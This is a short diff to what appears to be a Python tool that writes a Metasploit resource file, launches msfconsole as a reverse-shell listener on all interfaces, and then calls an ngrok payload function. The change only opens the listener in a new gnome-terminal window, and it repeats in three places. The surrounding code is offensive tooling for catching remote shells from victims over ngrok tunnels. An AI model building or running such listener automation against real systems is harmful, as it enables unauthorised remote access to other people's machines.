@@ -51,7 +51,7 @@ set lhost 0.0.0.0
 set lport {tcp}
 exploit""")
         file.close()
-        os.system("msfconsole -r global.listener &")
+        os.system("gnome-terminal -- msfconsole -r global.listener &")
         print("Done!!")
         input("Enter")
         ngrok_payload()
@@ -71,7 +71,7 @@ set lhost 0.0.0.0
 set lport {tcp}
 exploit""")
         file.close()
-        os.system("msfconsole -r global.listener &")
+        os.system("gnome-terminal -- msfconsole -r global.listener &")
         print("Done!!")
         input("Enter")
         ngrok_payload()
@@ -92,7 +92,7 @@ set lhost 0.0.0.0
 set lport {tcp}
 exploit""")
         file.close()
-        os.system("msfconsole -r global.listener &")
+        os.system("gnome-terminal -- msfconsole -r global.listener &")
         print("Done!!")
         input("Enter")
         ngrok_payload()
